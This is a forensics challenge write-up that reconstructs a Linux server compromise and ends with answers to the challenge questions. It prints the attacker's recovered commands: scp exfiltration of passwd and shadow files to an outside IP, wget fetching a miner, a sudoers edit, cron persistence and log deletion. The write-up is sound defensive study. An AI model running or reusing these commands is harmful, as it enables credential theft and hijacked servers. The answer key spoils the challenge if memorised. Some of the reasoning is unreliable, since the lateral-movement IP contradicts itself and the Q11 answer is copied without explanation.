# Scenario & Objective

During routine security audits at a startup, the SOC team detected unusual activity on Linux servers in the company’s infrastructure, including unexpected configuration changes and unfamiliar files in critical system directories. These anomalies suggest possible unauthorized access and raise concerns about the integrity of the server environment.

You received a disk image from one of the affected servers for forensic analysis. Your objective is to determine if a compromise has occurred, identify any tactics or tools used by a potential attacker, assess the scope and impact of the incident, and recommend mitigation strategies to safeguard against future breaches.

- **Category**: Endpoint Forensics
- **Tools**: losetup, VirusTotal, Photorec

## Overview

On October 28, 2024, an attacker moving laterally from internal IP `192.168.19.147` compromised a Linux server running Ubuntu. Starting at `14:46`, the attacker initiated SSH brute-force attacks targeting the `root` account and later the `ubuntu` account. At `15:08`, the attacker successfully authenticated via SSH as the `ubuntu` user. During an active SSH session up to `15:35`, the attacker created a backdoor account named `noah` (`sudo adduser noah`) and granted it elevated privileges (`sudo usermod -aG sudo noah`).

To maintain privileged access without password prompts, the attacker disabled tty tickets in `/etc/sudoers` (`echo 'Defaults !tty_tickets' >> /etc/sudoers`). The attacker then downloaded an XMRig cryptocurrency miner (`backup.elf`, original file name `xmr_linux_amd64 (3)`, MD5 `d25208063842ebf39e092d55e033f9e2`) from external IP `3.28.195.43` (`http://3.28.195.43/Tools/backup/backup.elf`) into `/tmp/backup.elf`. The attacker configured persistence by adding a crontab entry (`0 * * * * /tmp/backup.elf >/dev/null 2>&1`) to execute the miner hourly. Additionally, sensitive files including `passwd.txt`, `shadow.txt`, and `sudoers.txt` were exfiltrated to `/home/ubuntu/` on `3.28.195.43`. Before terminating the session with `exit`, the attacker attempted to erase evidence by deleting `.bash_history` and `/var/log/auth.log`.

# Analysis

First, I want to identify format of the file.
```cmd
$ file disk_image.img
disk_image.img: DOS/MBR boot sector, extended partition table (last)
```

Based on the answer, I know that the file is not a single partition, it is a copy of all hard disk that contain MBR part and many partitions.

So I want to mount the disk for making real, accessible storage device that I can access via file system. However, I need to instruct Linux to skip the MBR partition table at the beginning and jump directly to the data partition's offset. So I use losetup, this will attach a regular disk image file to a virtual block device.
```cmd
$ sudo losetup -fP --show disk_image.img
/dev/loop11

$ sudo fdisk -l /dev/loop11
Disk /dev/loop11: 8 GiB, 8589934592 bytes, 16777216 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: gpt
Disk identifier: B63FA830-79FB-43DA-83A9-FB450F4BE2D0

Device        Start      End  Sectors Size Type
/dev/loop11p1  2048     4095     2048   1M BIOS boot
/dev/loop11p2  4096 16775167 16771072   8G Linux filesystem
```

As you can see above, there are only 1 partition (`/dev/loop11p2`) while the `/dev/loop11p1` is MBR part. Based on that, I can mount the second virtual block.
```cmd
$ sudo mkdir /mnt/xmrig

$ sudo mount -o ro /dev/loop11p2 /mnt/xmrig
```

After mount process, I can access to the partitions of image file via file system.
<p align="center">
  <img src="./Assets/Image 1 - Successful mount process.png" alt="Successful mount process"/> <br/>
  <em>Image 1: Successful mount process</em>
</p>

Then I find in `home` folder and found a suspicious user `noah`. However, I cannot access into this folder.

Then when I find in `ubuntu`, I found the command that create `noah` user and assign priviledge permission to the account.
```cmd
/mnt/xmrig/home$ ls
noah  ubuntu

/mnt/xmrig/home$ cd noah/
bash: cd: noah/: Permission denied

/mnt/xmrig/home/ubuntu$ cat .bash_history 
sudo adduser noah
sudo usermod -aG sudo noah
sudo rm -f ~/.bash_history
sudo rm -f /var/log/auth.log
exit
```

At this point, I have no idea to continue investigation. So I will use the question as a hint for my investivation. Based on the information above, I can answer the question 1 and 2. 

For question 3, the scheduled tasks in linux is in crontab. So I find the crontab file.
```cmd
$ sudo su

/mnt/xmrig/var/spool/cron/crontabs# cat root 
...
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
...
0 * * * * /tmp/backup.elf >/dev/null 2>&1 
```

The command will quitely run the suspicious file `backup.elf` every hour. This is so suspicious, but I need to verify this file is malicious or not. So I need the hash of this file.
```cmd
/mnt/xmrig/tmp$ md5sum backup.elf 
d25208063842ebf39e092d55e033f9e2  backup.elf
```
<p align="center">
  <img src="./Assets/Image 2 - Malicious file.png" alt="Malicious file"/> <br/>
  <em>Image 2: Malicious file</em>
</p>

So the file definitely the malicious. And for answering question 5, I go to Detail tab in VirusTotal. 
<p align="center">
  <img src="./Assets/Image 3 - Original name of malicious.png" alt="Original name of malicious"/> <br/>
  <em>Image 3: Original name of malicious</em>
</p>

There are 2 names but only the `xmr_linux_amd64 (3)` match the format.

For question 6, to know exact file path on the attacker's server where the malicious miner was hosted, I need to recover these file. To do that, I use `Photorec` tool.
```cmd
$ mkdir /home/ubuntu/recovery

$ photorec

// Select virtual drive
>Disk /dev/loop11p2 - 8586 MB / 8189 MiB (RO)

// Choose space need to be analysed
>[   Whole   ] Extract files from whole partition

// Select where to store recovery files
>drwxrwxr-x  1000  1000      4096 27-Jul-2026 08:43 recovery
```

There are so many files that I cannot manually check all of them, so I use `grep` command and found some information as below.
```cmd
$ grep -r "tmp/backup.elf" recovery/
grep: recovery/recup_dir.21/f4628416.elf: binary file matches
recovery/recup_dir.4/f0420488.txt:0 * * * * /tmp/backup.elf >/dev/null 2>&1

$ strings recovery/recup_dir.21/f4628416.elf | grep -C 10 "tmp/backup.elf"
...

// Scheduled tasks that run backup.elf file every hour
0 * * * * /tmp/backup.elf >/dev/null 2>&1

// Turn off tty-tickets feature of sudo
echo 'Defaults !tty_tickets' >> /etc/sudoers

cat /etc/sudoers > /tmp/sudoers.txt
cat /etc/passwd > /tmp/passwd.txt
cat /etc/shadow > /tmp/shadow.txt
cat /etc/ssh/ssh_config > /tmp/sshconfig.txt

// Copy file to attacker server
scp /tmp/passwd.txt ubuntu@3.28.195.43:/home/ubuntu/passwd.txt
scp /tmp/sudoers.txt ubuntu@3.28.195.43:/home/ubuntu/sudoers.txt
scp /tmp/shadow.txt ubuntu@3.28.195.43:/home/ubuntu/shadow.txt
scp /tmp/sshconfig.txt ubuntu@3.28.195.43:/home/ubuntu/sshconfig.txt

// Download malware
wget http://3.28.239.653.28.195.43/Tools/backup/backup.elf -O /tmp/backup.elf
wget http://3.28.195.43/Tools/backup/backup.elf -O /tmp/backup.elf
chmod +x /tmp/backup.elf

crontab -e
exit 
uname -a 
cat /etc/*-release  
cat /proc/version 
cat ~/.profile 
df -h 
ps aux  
sudo -i 
exit 
```

So the attacker download the malicious from path `Tools/backup/backup.elf` of  server `3.28.195.43`.

According to the scenario of the question 9, to find the IP address of the machine the attacker used to perform lateral movement to this Linux box, I need to find the successfull login logs into the victim. To do that, I neec `auth.log` file.
```cmd
$ grep -r "auth.log" recovery/
grep: recovery/recup_dir.82/f16631240.gz: binary file matches
grep: recovery/recup_dir.21/f4599800.elf: binary file matches
...
grep: recovery/recup_dir.55/f7236608.xz: binary file matches
...
grep: recovery/recup_dir.55/f7192064.elf: binary file matches
...
grep: recovery/recup_dir.54/f6563840.elf: binary file matches
grep: recovery/recup_dir.65/f12575936.elf: binary file matches
...
grep: recovery/recup_dir.12/f0570448.deb: binary file matches
...
grep: recovery/recup_dir.70/f14157896.xz: binary file matches
grep: recovery/recup_dir.70/f13582272.elf: binary file matches
```

As there are so many files here, so I need a specific search term here.  Follow [Identify Unusual Login Activities in Linux Using Log Analysis](https://linuxsecurity.com/howtos/secure-my-network/understand-failed-authentication-patterns-linux-logs), I know the success login of linux in `auth.log` file is have term `Accepted password`. I will search follow this term.
```cmd
$ grep -r "Accepted password" recovery/
grep: recovery/recup_dir.70/f14157896.xz: binary file matches

$ strings recovery/recup_dir.70/f14157896.xz | grep "Accepted password"
Oct 28 15:08:18 inuxserver sshd[2167]: Accepted password for ubuntu from 192.168.19.147 port 47252 ssh2
Oct 28 15:09:40 inuxserver sshd[2235]: Accepted password for ubuntu from 192.168.19.147 port 44908 ssh2
Oct 28 15:35:21 inuxserver sshd[2379]: Accepted password for ubuntu from 192.168.19.147 port 35248 ssh2
Oct 28 15:49:57 inuxserver sshd[2589]: Accepted password for ubuntu from 192.168.19.158 port 56242 ssh2
```

There is only sucessfull login from IP `192.168.19.158`, so this definitely a malicious. 

To detect brute-force attemps to know the first username that the attacker targeted in question 10, I search with term `Failed password` as failed login in the link above.
```cmd
$ grep -r "Failed password" recovery/
grep: recovery/recup_dir.21/f4628416.elf: binary file matches
recovery/recup_dir.4/f0420384.txt:Oct 28 14:48:15 inuxserver sshd[1730]: Failed password for root from 192.168.19.147 port 33844 ssh2
recovery/recup_dir.4/f0420384.txt:Oct 28 14:48:15 inuxserver sshd[1732]: Failed password for root from 192.168.19.147 port 33856 ssh2
recovery/recup_dir.4/f0420384.txt:Oct 28 14:48:15 inuxserver sshd[1734]: Failed password for root from 192.168.19.147 port 33870 ssh2
...
grep: recovery/recup_dir.70/f14157896.xz: binary file matches

$ strings recovery/recup_dir.21/f4628416.elf | grep "Failed password"
Oct 28 14:46:44 inuxserver sshd[1691]: Failed password for root from 192.168.19.147 port 49866 ssh2
Oct 28 14:46:44 inuxserver sshd[1692]: Failed password for root from 192.168.19.147 port 49880 ssh2
Oct 28 14:46:44 inuxserver sshd[1693]: Failed password for root from 192.168.19.147 port 49882 ssh2
...

$ strings recovery/recup_dir.70/f14157896.xz | grep "Failed password"
Oct 28 14:52:15 inuxserver sshd[1820]: Failed password for root from 192.168.19.147 port 41770 ssh2
Oct 28 14:52:15 inuxserver sshd[1821]: Failed password for root from 192.168.19.147 port 41786 ssh2
Oct 28 14:52:17 inuxserver sshd[1812]: Failed password for root from 192.168.19.147 port 41724 ssh2
...
Oct 28 15:02:47 inuxserver sshd[2049]: Failed password for ubuntu from 192.168.19.147 port 52604 ssh2
Oct 28 15:02:47 inuxserver sshd[2052]: Failed password for ubuntu from 192.168.19.147 port 52638 ssh2
Oct 28 15:02:47 inuxserver sshd[2050]: Failed password for ubuntu from 192.168.19.147 port 52618 ssh2
...
```

Based on the result above, the first username the attacker targeted in these brute-force attempts is `root` at about `14:46` in `28/10`.
# Answer the Questions

**Q1: Assigning high-level privileges to a new user is essential in the attack chain, as it enables the attacker to execute commands with administrative access, ensuring persistent control over the system. What command did the attacker use to grant elevated privileges to the newly created user?**

It is `sudo usermod -aG sudo noah`.

**Q2: Understanding the commands used by the attacker to cover their traces is essential for identifying attempts to hide malicious activity on the system. What is the second command the attacker used to erase evidence from the system?**

It is `sudo rm -f /var/log/auth.log`.

**Q3: Identifying the configuration added or modified by the attacker for persistence is essential for detecting and removing recurring malicious activities on the system. What configuration line did the attacker add to one of the key Linux system files for scheduled tasks to ensure the miner would run continuously?**

The configuration line is `0 * * * * /tmp/backup.elf >/dev/null 2>&1 `.

**Q4: Identifying the hash of the malicious file is crucial for confirming its uniqueness and tracking its presence across systems. What is the MD5 hash of the file dropped by the attacker with mining capabilities?**

The MD5 hash is `d25208063842ebf39e092d55e033f9e2`.

**Q5: Knowing the original name of a malicious file helps link it to known malware families and provides valuable insights into its behavior. According to threat intelligence reports, what is the original name of the miner?**

The original name of this malicious is `xmr_linux_amd64 (3)`.

**Q6: Understanding the attacker's actions is crucial for tracing how malicious files were introduced to the system. The attacker successfully executed a command to download and save the miner on the compromised Linux system. What was the exact file path on the attacker's server where the malicious miner was hosted?**

The exact file path is `Tools/backup/backup.elf`.

**Q7: To understand which sensitive information was accessed and transferred from the compromised system, it’s essential to identify the files exfiltrated by the attacker. What is the full path on the attacker’s remote machine where the exfiltrated passwd file was saved?**

It is `/home/ubuntu/passwd.txt`.

**Q8: Understanding how the attacker maintained elevated privileges without repeated permission prompts is essential for uncovering their methods of persistent access. What command did the attacker use to configure continuous privilege escalation without requiring repeated permission?**

It is `echo 'Defaults !tty_tickets' >> /etc/sudoers`.

**Q9: Identifying the source IP address used for lateral movement is essential for tracing the attacker's path and understanding the extent of the compromise. What is the IP address of the machine the attacker used to perform lateral movement to this Linux box?**

The IP address of the machine the attacker used to perform lateral movement is `192.168.19.147`.

**Q10: Identifying the first username targeted by the attacker in their brute-force attempts offers insight into their initial access strategy and target selection, as the attacker attempted to access two different accounts. What was the first username the attacker targeted in these brute-force attempts?**

It is `root`.

**Q11: Determining the timestamp of the attacker’s final login is crucial for identifying when they last accessed the system to hide their activities and erase evidence. What is the timestamp of the last login session during which the attacker cleared traces on the compromised machine?**

According to `Accepted password` search term above, the timestamp of last login session is `Oct 28 15:49:57`. However, this is not a correct answer and I don't know why, I also don't know the year of this attemp.

So I decide to read the official walkthrough but it still doesn't have year timestamp. Then when I read the writeup of inksec, I found the answer is `2024-10-28 15:35`, but I still don't know how to get this answer.

**Q12: During the attacker’s SSH session, they used a command that mistakenly saved their activities to the hard drive rather than keeping them in memory where they’d be more difficult to analyze. Which bash command did they use that left this trace?**

The bash command is `exit`.